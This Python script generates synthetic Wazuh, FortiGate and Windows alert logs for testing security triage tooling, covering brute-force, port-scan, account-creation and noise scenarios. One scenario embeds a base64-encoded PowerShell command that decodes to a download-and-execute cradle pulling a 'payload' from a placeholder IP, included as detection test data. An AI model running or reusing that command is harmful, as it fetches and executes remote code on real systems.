"""
Sample Wazuh alert data generator — untuk testing script tanpa data produksi.

Menghasilkan file JSONL dengan 3 skenario insiden:
  1. Brute force RDP (15 event, external IP)
  2. Nessus vulnerability scan (8 event, internal scanner → FP)
  3. Suspicious encoded PowerShell (3 event, predictable pattern)
  + 3 event normal (noise)
"""

import json
from datetime import datetime, timedelta
from pathlib import Path


def generate_sample(output_path: str) -> None:
    """Generate sample Wazuh alerts dan tulis ke file JSONL."""
    events = []
    base_time = datetime(2026, 8, 10, 4, 23, 0)

    # ── Skenario 1: Brute Force RDP (15 event, 42 menit) ──────────
    users = ["Administrator", "Administrator", "Administrator",
             "Guest", "Guest",
             "backup_svc", "backup_svc", "backup_svc",
             "svc_sqlserver", "svc_sqlserver",
             "root", "root",
             "admin", "admin", "test"]
    ports = list(range(55987, 55987 + 15))

    for i in range(15):
        t = base_time + timedelta(
            seconds=i * (168 if i < 10 else 45)
        )
        events.append({
            "timestamp": t.strftime("%Y-%m-%dT%H:%M:%S.000+0000"),
            "rule": {
                "id": "5710" if i < 10 else "5712",
                "level": 5 if i < 8 else 10,
                "description": "sshd: brute force attack" if i < 10
                else "sshd: multiple authentication failures",
                "mitre": {"id": ["T1110"], "tactic": ["Credential Access"], "technique": ["Brute Force"]},
                "firedtimes": i + 1,
                "groups": ["syslog", "sshd", "authentication_failed"],
            },
            "agent": {"id": "001", "name": "DC01", "ip": "10.0.0.5"},
            "manager": {"name": "wazuh-manager"},
            "id": f"1723277297.17{i:06d}",
            "full_log": (
                f"Aug 10 {t.strftime('%H:%M:%S')} DC01 sshd[{12345 + i}]: "
                f"Failed password for {users[i]} from 203.0.113.5 port {ports[i]} ssh2"
            ),
            "predecoder": {
                "program_name": "sshd",
                "timestamp": t.strftime("%b %d %H:%M:%S"),
                "hostname": "DC01",
            },
            "decoder": {"name": "sshd", "parent": "sshd"},
            "data": {
                "srcip": "203.0.113.5",
                "srcport": str(ports[i]),
                "dstuser": users[i],
            },
            "location": "/var/log/auth.log",
        })

    # ── Skenario 2: Nessus vuln scan (8 event, 2 menit) ──────────
    scan_start = base_time + timedelta(hours=6, minutes=10)
    scan_ports = [22, 80, 443, 3389, 8080, 8443, 5900, 6379]
    scan_ip = "10.0.1.50"

    for i in range(8):
        t = scan_start + timedelta(seconds=i * 15)
        events.append({
            "timestamp": t.strftime("%Y-%m-%dT%H:%M:%S.000+0000"),
            "rule": {
                "id": "31151",
                "level": 4,
                "description": "ossec: multiple connection attempts to different ports",
                "mitre": {"id": ["T1046"], "tactic": ["Discovery"], "technique": ["Network Service Scanning"]},
                "firedtimes": 8,
                "groups": ["syslog", "recon"],
            },
            "agent": {"id": "005", "name": "SIEM-NESSUS", "ip": scan_ip},
            "manager": {"name": "wazuh-manager"},
            "id": f"1723279900.10{i:06d}",
            "full_log": (
                f"Aug 10 {t.strftime('%H:%M:%S')} Nessus scan: "
                f"port {scan_ports[i]} TCP connect {scan_ip} "
                f"user-agent: Nessus v10.5.0"
            ),
            "predecoder": {
                "program_name": "nessusd",
                "timestamp": t.strftime("%b %d %H:%M:%S"),
                "hostname": "SIEM-NESSUS",
            },
            "decoder": {"name": "nessusd"},
            "data": {
                "srcip": scan_ip,
                "dstport": str(scan_ports[i]),
                "proto": "tcp",
            },
            "location": "/var/log/messages",
            "user_agent": "Nessus v10.5.0",
        })

    # ── Skenario 3: Suspicious encoded PowerShell (3 event) ───────
    ps_start = base_time + timedelta(hours=4, minutes=42)
    ps_host = "SRV-FILE01"
    ps_ip = "10.0.2.33"
    ps_user = "svc_web"

    for i in range(3):
        t = ps_start + timedelta(seconds=i * 3)
        events.append({
            "timestamp": t.strftime("%Y-%m-%dT%H:%M:%S.000+0000"),
            "rule": {
                "id": "91816",
                "level": 8,
                "description": "Microsoft Windows: Powershell execution with encoded command",
                "mitre": {"id": ["T1059.001"], "tactic": ["Execution"], "technique": ["PowerShell"]},
                "firedtimes": 1,
                "groups": ["windows", "powershell", "suspicious"],
            },
            "agent": {"id": "003", "name": ps_host, "ip": ps_ip},
            "manager": {"name": "wazuh-manager"},
            "id": f"1723280000.20{i:06d}",
            "full_log": (
                f"powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AIAAxADkAOAAuADUAMQAuADEAMAAwAC4AMgAzAC8AcABhAHkAbABvAGEAZAAnACkA"
            ),
            "predecoder": {
                "program_name": "powershell",
                "timestamp": t.strftime("%b %d %H:%M:%S"),
                "hostname": ps_host,
            },
            "decoder": {"name": "powershell"},
            "data": {
                "srcip": ps_ip,
                "srcuser": ps_user,
                "command": "powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAG...",
            },
            "location": "Windows EventLog",
        })

    # ── Event noise / normal (3 event) ────────────────────────────
    for i in range(3):
        t = base_time + timedelta(hours=2 + i)
        events.append({
            "timestamp": t.strftime("%Y-%m-%dT%H:%M:%S.000+0000"),
            "rule": {
                "id": "550" if i > 0 else "502",
                "level": 2 if i > 0 else 3,
                "description": "sshd: authentication success" if i > 0
                else "ossec: agent started",
                "mitre": {},
                "firedtimes": 1,
                "groups": ["syslog", "authentication_success" if i > 0 else "ossec"],
            },
            "agent": {"id": "001", "name": "DC01", "ip": "10.0.0.5"},
            "manager": {"name": "wazuh-manager"},
            "id": f"1723290000.00{i:06d}",
            "full_log": (
                f"Aug 10 {t.strftime('%H:%M:%S')} DC01 sshd[{23456}]: "
                f"Accepted publickey for admin from 10.0.2.10 port 45678 ssh2"
            ),
            "predecoder": {
                "program_name": "sshd",
                "timestamp": t.strftime("%b %d %H:%M:%S"),
                "hostname": "DC01",
            },
            "decoder": {"name": "sshd"},
            "data": {
                "srcip": "10.0.2.10",
                "srcport": "45678",
                "dstuser": "admin",
            },
            "location": "/var/log/auth.log",
        })

    # Tulis ke file
    Path(output_path).parent.mkdir(parents=True, exist_ok=True)
    with open(output_path, "w") as f:
        for event in events:
            f.write(json.dumps(event) + "\n")

    print(f"  Total: {len(events)} events")
    print(f"  Insiden: 1 BRUTE_FORCE (15 event) + 1 PORT_SCAN/FP (8 event) "
          f"+ 1 SUSPICIOUS_PROC (3 event) + 3 noise")


def generate_sample_fortigate(output_path: str) -> None:
    """Generate sample FortiGate syslog buat testing."""
    events = []
    base = datetime(2026, 8, 10, 4, 23, 0)

    # Scenario: brute force RDP yang KEDETEK di FortiGate (12 event deny/block)
    for i in range(12):
        t = base + timedelta(seconds=i * 45)
        events.append(
            f"date={t.strftime('%Y-%m-%d')} time={t.strftime('%H:%M:%S')} "
            f"devname=FG-01 logid=0000000013 type=traffic subtype=forward "
            f"level=notice vd=root srcip=203.0.113.5 srcport={56000 + i} "
            f'srcintf="wan1" dstip=10.0.0.5 dstport=3389 dstintf="lan" '
            f"proto=6 service=RDP action=deny policyid=99 "
            f"duration=0 sentbyte=0 rcvdbyte=0 sentpkt=0 rcvdpkt=0"
        )

    # Normal traffic outbound (3 event)
    for i in range(3):
        t = base + timedelta(hours=2 + i)
        events.append(
            f"date={t.strftime('%Y-%m-%d')} time={t.strftime('%H:%M:%S')} "
            f"devname=FG-01 logid=0000000013 type=traffic subtype=forward "
            f"level=notice vd=root srcip=10.0.2.10 srcport={45000 + i} "
            f'srcintf="lan" dstip=142.250.80.46 dstport=443 dstintf="wan1" '
            f"proto=6 service=HTTPS action=accept policyid=3 "
            f"duration=120 sentbyte=2048 rcvdbyte=15000 sentpkt=10 rcvdpkt=15"
        )

    # Blocked SSH attempt (2 event)
    for i in range(2):
        t = base + timedelta(hours=5, seconds=i * 10)
        events.append(
            f"date={t.strftime('%Y-%m-%d')} time={t.strftime('%H:%M:%S')} "
            f"devname=FG-01 logid=0000000013 type=traffic subtype=forward "
            f"level=notice vd=root srcip=198.51.100.50 srcport={60000 + i} "
            f'srcintf="wan1" dstip=10.0.0.10 dstport=22 dstintf="lan" '
            f"proto=6 service=SSH action=deny policyid=50 "
            f"duration=0 sentbyte=0 rcvdbyte=0 sentpkt=0 rcvdpkt=0"
        )

    Path(output_path).parent.mkdir(parents=True, exist_ok=True)
    with open(output_path, "w") as f:
        for line in events:
            f.write(line + "\n")

    print(f"  Total: {len(events)} FortiGate events")
    print(f"  Insiden: 12 RDP brute force (blocked) + 2 SSH block + 3 normal")


def generate_sample_windows(output_path: str) -> None:
    """Generate sample Windows EventLog (Wazuh format) buat testing."""
    events = []
    base = datetime(2026, 8, 10, 8, 30, 0)

    # Scenario 1: Login failure bertubi-tubi dari IP eksternal (8 event)
    for i in range(8):
        t = base + timedelta(seconds=i * 12)
        events.append({
            "timestamp": t.strftime("%Y-%m-%dT%H:%M:%S.000+0000"),
            "rule": {
                "id": "60122",
                "level": 5,
                "description": "Windows logon failure (EventID 4625)",
                "mitre": {"id": ["T1110"], "tactic": ["Credential Access"], "technique": ["Brute Force"]},
                "firedtimes": i + 1,
                "groups": ["windows", "authentication_failed"],
            },
            "agent": {"id": "007", "name": "SRV-WEB01", "ip": "10.0.1.20"},
            "manager": {"name": "wazuh-manager"},
            "id": f"1723300000.00{i:06d}",
            "full_log": (
                f"EventID: 4625 | Account: svc_admin | "
                f"LogonType: 10 (RemoteInteractive) | "
                f"Source: 203.0.113.5 | Workstation: —"
            ),
            "predecoder": {
                "program_name": "windows_event",
                "hostname": "SRV-WEB01",
            },
            "decoder": {"name": "windows"},
            "data": {
                "srcip": "203.0.113.5",
                "dstuser": "svc_admin",
                "id": "4625",
                "logon_type": "10",
            },
            "location": "Security",
        })

    # Scenario 2: User account created — suspicious (2 event)
    for i in range(2):
        t = base + timedelta(minutes=5 + i)
        events.append({
            "timestamp": t.strftime("%Y-%m-%dT%H:%M:%S.000+0000"),
            "rule": {
                "id": "60204",
                "level": 6,
                "description": "Windows: A user account was created (EventID 4720)",
                "mitre": {"id": ["T1136"], "tactic": ["Persistence"], "technique": ["Create Account"]},
                "firedtimes": 1,
                "groups": ["windows", "account_management"],
            },
            "agent": {"id": "007", "name": "SRV-WEB01", "ip": "10.0.1.20"},
            "manager": {"name": "wazuh-manager"},
            "id": f"1723301000.00{i:06d}",
            "full_log": (
                f"EventID: 4720 | New Account: sql_helper | "
                f"Created by: svc_admin | Domain: CORP"
            ),
            "predecoder": {
                "program_name": "windows_event",
                "hostname": "SRV-WEB01",
            },
            "decoder": {"name": "windows"},
            "data": {
                "dstuser": "sql_helper",
                "srcuser": "svc_admin",
                "id": "4720",
            },
            "location": "Security",
        })

    # Scenario 3: Normal logon from internal IP (2 event) — noise
    for i in range(2):
        t = base + timedelta(hours=1 + i)
        events.append({
            "timestamp": t.strftime("%Y-%m-%dT%H:%M:%S.000+0000"),
            "rule": {
                "id": "60106",
                "level": 3,
                "description": "Windows logon success (EventID 4624)",
                "mitre": {},
                "firedtimes": 1,
                "groups": ["windows", "authentication_success"],
            },
            "agent": {"id": "008", "name": "DESKTOP-USER1", "ip": "10.0.3.45"},
            "manager": {"name": "wazuh-manager"},
            "id": f"1723302000.00{i:06d}",
            "full_log": (
                f"EventID: 4624 | Account: johndoe | "
                f"LogonType: 7 (Unlock) | Source: —"
            ),
            "predecoder": {
                "program_name": "windows_event",
                "hostname": "DESKTOP-USER1",
            },
            "decoder": {"name": "windows"},
            "data": {
                "dstuser": "johndoe",
                "id": "4624",
                "logon_type": "7",
            },
            "location": "Security",
        })

    Path(output_path).parent.mkdir(parents=True, exist_ok=True)
    with open(output_path, "w") as f:
        for event in events:
            f.write(json.dumps(event) + "\n")

    print(f"  Total: {len(events)} Windows events")
    print(f"  Insiden: 8 login failures (external) + 2 user created + 2 normal logon")
